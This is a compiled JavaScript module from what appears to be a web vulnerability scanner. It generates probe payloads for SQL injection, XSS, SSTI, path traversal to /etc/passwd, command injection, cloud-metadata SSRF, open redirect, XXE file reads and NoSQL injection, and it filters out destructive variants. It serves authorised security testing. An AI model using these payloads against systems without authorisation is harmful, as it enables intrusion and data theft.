"use strict";
// Adapted from source-reference/vantix/secops/skills/payload_mutation.py
// (snapshot 2026-05-26). Rewritten in TypeScript with Proxy Forge naming, types,
// and storage model. No runtime dependency on the vendored source.
Object.defineProperty(exports, "__esModule", { value: true });
exports.generatePayloadVariants = generatePayloadVariants;
exports.familiesForInsertionPoint = familiesForInsertionPoint;
function variantId(family, index, suffix) {
    return `pv-${family}-${index.toString().padStart(3, '0')}-${suffix}`;
}
function rawVariant(family, index, value, intent, expectedSignals, opts) {
    return {
        id: variantId(family, index, 'raw'),
        family,
        value,
        encoding: 'raw',
        intent,
        destructiveRisk: 'none',
        expectedSignals,
        ...opts,
    };
}
// ─── SQL injection ──────────────────────────────────────────────────────────
function sqlInjectionVariants(ctx) {
    const f = 'sql-injection';
    return [
        rawVariant(f, 0, "' OR '1'='1", 'Classic OR-based tautology', ['sql-error', 'always-true'], { destructiveRisk: 'none' }),
        rawVariant(f, 1, "' OR 1=1--", 'Comment-terminated tautology', ['sql-error', 'always-true']),
        rawVariant(f, 2, "'; SELECT 1--", 'Stacked query probe', ['sql-error']),
        rawVariant(f, 3, "1 AND SLEEP(5)--", 'Time-based blind SQLi', ['timing-delta'], { intent: 'Timing blind probe (MySQL)' }),
        rawVariant(f, 4, "1 WAITFOR DELAY '0:0:5'--", 'Time-based blind SQLi (MSSQL)', ['timing-delta']),
        rawVariant(f, 5, "' UNION SELECT NULL--", 'UNION-based probe', ['sql-error', 'union-data']),
        rawVariant(f, 6, "1' AND '1'='2", 'Negative tautology (false branch)', ['sql-error', 'empty-response']),
        rawVariant(f, 7, encodeURIComponent("' OR '1'='1"), 'URL-encoded OR tautology', ['sql-error'], { encoding: 'url' }),
    ].slice(0, ctx.maxVariants ?? 8);
}
// ─── Reflected XSS ──────────────────────────────────────────────────────────
function reflectedXssVariants(ctx) {
    const f = 'xss-reflected';
    return [
        rawVariant(f, 0, '<script>alert(1)</script>', 'HTML context script injection', ['xss-reflection', 'script-tag']),
        rawVariant(f, 1, '"><script>alert(1)</script>', 'Attribute breakout + script', ['xss-reflection', 'script-tag']),
        rawVariant(f, 2, "'><img src=x onerror=alert(1)>", 'Attribute breakout + img onerror', ['xss-reflection', 'event-handler']),
        rawVariant(f, 3, 'javascript:alert(1)', 'JS-scheme in href context', ['xss-reflection', 'js-url']),
        rawVariant(f, 4, '&lt;script&gt;alert(1)&lt;/script&gt;', 'HTML-entity encoded probe', ['xss-reflection'], { encoding: 'html' }),
        rawVariant(f, 5, '%3Cscript%3Ealert(1)%3C%2Fscript%3E', 'URL-encoded probe', ['xss-reflection'], { encoding: 'url' }),
        rawVariant(f, 6, '<svg onload=alert(1)>', 'SVG onload probe', ['xss-reflection', 'event-handler']),
        rawVariant(f, 7, '{{7*7}}', 'Template expression fallback signal', ['ssti-fallback', 'xss-reflection']),
    ].slice(0, ctx.maxVariants ?? 8);
}
// ─── SSTI ────────────────────────────────────────────────────────────────────
function sstiVariants(ctx) {
    const f = 'ssti';
    return [
        rawVariant(f, 0, '{{7*7}}', 'Jinja2/Twig math expression', ['ssti-reflection', 'math-eval']),
        rawVariant(f, 1, '${7*7}', 'FreeMarker/EL math expression', ['ssti-reflection', 'math-eval']),
        rawVariant(f, 2, '<%= 7*7 %>', 'ERB math expression', ['ssti-reflection', 'math-eval']),
        rawVariant(f, 3, '#{7*7}', 'Ruby/EL hash math expression', ['ssti-reflection', 'math-eval']),
        rawVariant(f, 4, '{{7*\'7\'}}', 'Jinja2 string multiplication probe', ['ssti-reflection']),
        rawVariant(f, 5, '*{7*7}', 'Thymeleaf expression', ['ssti-reflection', 'math-eval']),
        rawVariant(f, 6, '{{config}}', 'Jinja2 config leak probe', ['ssti-reflection', 'config-leak']),
        rawVariant(f, 7, '${class.getResource("")}', 'FreeMarker RCE vector', ['ssti-reflection', 'rce-indicator'], { destructiveRisk: 'medium' }),
    ].slice(0, ctx.maxVariants ?? 8);
}
// ─── LFI / Path traversal ────────────────────────────────────────────────────
function lfiTraversalVariants(ctx) {
    const f = 'lfi-traversal';
    return [
        rawVariant(f, 0, '../../../etc/passwd', 'Classic Unix path traversal', ['file-content', 'passwd-pattern']),
        rawVariant(f, 1, '..%2F..%2F..%2Fetc%2Fpasswd', 'URL-encoded traversal', ['file-content', 'passwd-pattern'], { encoding: 'url' }),
        rawVariant(f, 2, '..\\..\\..\\windows\\win.ini', 'Windows path traversal', ['file-content', 'win-ini-pattern']),
        rawVariant(f, 3, '....//....//....//etc/passwd', 'Double-slash traversal bypass', ['file-content', 'passwd-pattern']),
        rawVariant(f, 4, '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', 'Double-URL encoded traversal', ['file-content'], { encoding: 'double-url' }),
        rawVariant(f, 5, '/etc/passwd', 'Absolute path probe', ['file-content', 'passwd-pattern']),
        rawVariant(f, 6, '..%252f..%252f..%252fetc%252fpasswd', 'Double-encoded percent traversal', ['file-content']),
        rawVariant(f, 7, '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd', 'Unicode overlong traversal', ['file-content']),
    ].slice(0, ctx.maxVariants ?? 8);
}
// ─── Command injection ────────────────────────────────────────────────────────
function commandInjectionVariants(ctx) {
    const f = 'command-injection';
    return [
        rawVariant(f, 0, '; id', 'Semicolon-chained id', ['command-output', 'uid-pattern']),
        rawVariant(f, 1, '| id', 'Pipe-chained id', ['command-output', 'uid-pattern']),
        rawVariant(f, 2, '`id`', 'Backtick id substitution', ['command-output', 'uid-pattern']),
        rawVariant(f, 3, '$(id)', 'Dollar-paren id substitution', ['command-output', 'uid-pattern']),
        rawVariant(f, 4, '; whoami', 'Semicolon whoami probe', ['command-output', 'username-pattern']),
        rawVariant(f, 5, '& ping -c 1 127.0.0.1', 'Background ping probe (non-blocking)', ['timing-delta']),
        rawVariant(f, 6, '| echo proxyforge_cmd_probe', 'Canary echo probe', ['canary-echo']),
        rawVariant(f, 7, '; sleep 5', 'Time-based blind probe', ['timing-delta'], { intent: 'Blind time-delay probe' }),
    ].slice(0, ctx.maxVariants ?? 8);
}
// ─── SSRF ────────────────────────────────────────────────────────────────────
function ssrfVariants(ctx) {
    const f = 'ssrf';
    const oastTarget = ctx.oastBaseUrl ? `${ctx.oastBaseUrl}/ssrf-probe` : 'http://169.254.169.254/';
    return [
        rawVariant(f, 0, 'http://169.254.169.254/latest/meta-data/', 'AWS metadata endpoint', ['ssrf-response', 'metadata-content']),
        rawVariant(f, 1, 'http://metadata.google.internal/computeMetadata/v1/', 'GCP metadata endpoint', ['ssrf-response', 'metadata-content']),
        rawVariant(f, 2, 'http://169.254.169.254/metadata/v1/', 'Azure IMDS endpoint', ['ssrf-response', 'metadata-content']),
        rawVariant(f, 3, 'http://localhost/', 'Localhost probe', ['ssrf-response', 'loopback']),
        rawVariant(f, 4, 'http://0.0.0.0/', 'Zero-route loopback', ['ssrf-response', 'loopback']),
        rawVariant(f, 5, 'http://[::1]/', 'IPv6 loopback', ['ssrf-response', 'loopback']),
        rawVariant(f, 6, oastTarget, 'OAST callback probe', ['oast-callback-confirmed'], { requiresOast: true }),
        rawVariant(f, 7, 'file:///etc/passwd', 'File-scheme SSRF', ['file-content', 'passwd-pattern'], { destructiveRisk: 'low' }),
    ].slice(0, ctx.maxVariants ?? 8);
}
// ─── Open redirect ───────────────────────────────────────────────────────────
function openRedirectVariants(ctx) {
    const f = 'open-redirect';
    return [
        rawVariant(f, 0, 'https://evil.example.com/', 'Absolute cross-origin redirect', ['redirect-location', 'cross-origin']),
        rawVariant(f, 1, '//evil.example.com/', 'Protocol-relative redirect', ['redirect-location', 'cross-origin']),
        rawVariant(f, 2, 'javascript:alert(1)', 'JS-scheme redirect', ['redirect-location', 'js-url']),
        rawVariant(f, 3, '\\\\evil.example.com', 'Backslash redirect bypass', ['redirect-location', 'cross-origin']),
        rawVariant(f, 4, 'JaVaScRiPt:alert(1)', 'Mixed-case JS scheme bypass', ['redirect-location', 'js-url']),
        rawVariant(f, 5, '%09javascript:alert(1)', 'Tab-prefixed JS scheme bypass', ['redirect-location', 'js-url'], { encoding: 'url' }),
        rawVariant(f, 6, 'data:text/html,<script>alert(1)</script>', 'Data-URI redirect', ['redirect-location', 'data-uri']),
        rawVariant(f, 7, 'http://evil.example.com%2F@legitimate.example.com/', 'URL authority confusion redirect', ['redirect-location', 'cross-origin']),
    ].slice(0, ctx.maxVariants ?? 8);
}
// ─── XXE ─────────────────────────────────────────────────────────────────────
function xxeVariants(ctx) {
    const f = 'xxe';
    return [
        rawVariant(f, 0, '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', 'Classic file read XXE', ['file-content', 'xxe-reflection']),
        rawVariant(f, 1, '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>', 'SSRF via XXE', ['ssrf-response', 'xxe-reflection']),
        rawVariant(f, 2, '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe;]>', 'Parameter entity XXE', ['file-content', 'xxe-error']),
        rawVariant(f, 3, '<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', 'UTF-16 encoded XXE', ['file-content']),
        rawVariant(f, 4, '<!DOCTYPE test [<!ENTITY xxe SYSTEM "/dev/random">]><test>&xxe;</test>', 'DoS indicator (dev/random — capped)', ['timing-delta'], { destructiveRisk: 'low' }),
        rawVariant(f, 5, '<?xml?><!DOCTYPE x SYSTEM "http://127.0.0.1/xxe-probe"><!-- comment --><x/>', 'Minimal SSRF XXE canary', ['ssrf-response']),
        rawVariant(f, 6, '<![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]>', 'CDATA XSS injection via XML', ['xss-reflection']),
        rawVariant(f, 7, ctx.oastBaseUrl ? `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "${ctx.oastBaseUrl}/xxe-probe">]><foo>&xxe;</foo>` : '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://oast.placeholder/xxe">]><foo>&xxe;</foo>', 'OAST-confirmed XXE', ['oast-callback-confirmed'], { requiresOast: Boolean(ctx.oastBaseUrl) }),
    ].slice(0, ctx.maxVariants ?? 8);
}
// ─── NoSQL injection ─────────────────────────────────────────────────────────
function nosqlInjectionVariants(ctx) {
    const f = 'nosql-injection';
    return [
        rawVariant(f, 0, '{"$gt": ""}', 'MongoDB gt operator probe', ['nosql-auth-bypass', 'array-response']),
        rawVariant(f, 1, '{"$ne": null}', 'MongoDB ne-null probe', ['nosql-auth-bypass']),
        rawVariant(f, 2, '{"$regex": ".*"}', 'MongoDB regex wildcard', ['nosql-auth-bypass', 'all-records']),
        rawVariant(f, 3, '{"$where": "1==1"}', 'MongoDB where-true tautology', ['nosql-auth-bypass'], { destructiveRisk: 'low' }),
        rawVariant(f, 4, '\'||1||\'', 'JavaScript injection tautology', ['nosql-auth-bypass']),
        rawVariant(f, 5, '[$gt]=&[$lt]=z', 'URL query operator injection', ['nosql-auth-bypass', 'array-response']),
        rawVariant(f, 6, 'a,b', 'CouchDB view injection', ['nosql-error']),
        rawVariant(f, 7, '{"$or":[{"a":1},{"b":1}]}', 'Or-operator combination probe', ['nosql-auth-bypass']),
    ].slice(0, ctx.maxVariants ?? 8);
}
// ─── Dispatcher ──────────────────────────────────────────────────────────────
const FAMILY_DISPATCHERS = {
    'sql-injection': sqlInjectionVariants,
    'xss-reflected': reflectedXssVariants,
    'xss-oracle': reflectedXssVariants,
    'ssti': sstiVariants,
    'lfi-traversal': lfiTraversalVariants,
    'command-injection': commandInjectionVariants,
    'ssrf': ssrfVariants,
    'ssrf-oast': ssrfVariants,
    'open-redirect': openRedirectVariants,
    'xxe': xxeVariants,
    'xxe-oast': xxeVariants,
    'nosql-injection': nosqlInjectionVariants,
};
function generatePayloadVariants(ctx) {
    const dispatcher = FAMILY_DISPATCHERS[ctx.family];
    if (!dispatcher)
        return [];
    let variants = dispatcher(ctx);
    // Filter OAST-requiring variants when no OAST context is provided.
    if (!ctx.oastBaseUrl) {
        variants = variants.filter((v) => !v.requiresOast);
    }
    // Filter high-destructive variants unless explicitly allowed (future: approval gate).
    variants = variants.filter((v) => v.destructiveRisk !== 'high');
    // Deduplicate by value.
    const seen = new Set();
    variants = variants.filter((v) => {
        if (seen.has(v.value))
            return false;
        seen.add(v.value);
        return true;
    });
    return variants.slice(0, ctx.maxVariants ?? 20);
}
function familiesForInsertionPoint(kind) {
    switch (kind) {
        case 'query':
        case 'body':
        case 'form':
            return ['sql-injection', 'xss-reflected', 'ssti', 'lfi-traversal', 'command-injection', 'ssrf', 'open-redirect', 'nosql-injection'];
        case 'json':
            return ['sql-injection', 'xss-reflected', 'ssti', 'nosql-injection', 'command-injection', 'ssrf'];
        case 'xml':
            return ['xxe', 'sql-injection', 'xss-reflected'];
        case 'header':
            return ['xss-reflected', 'ssrf', 'host-header', 'crlf-injection', 'command-injection'];
        case 'cookie':
            return ['sql-injection', 'xss-reflected', 'nosql-injection'];
        case 'path':
            return ['lfi-traversal', 'open-redirect', 'sql-injection'];
        case 'graphql':
            return ['graphql-attack', 'sql-injection', 'xss-reflected'];
        case 'multipart':
            return ['lfi-traversal', 'xss-reflected'];
        default:
            return ['sql-injection', 'xss-reflected'];
    }
}
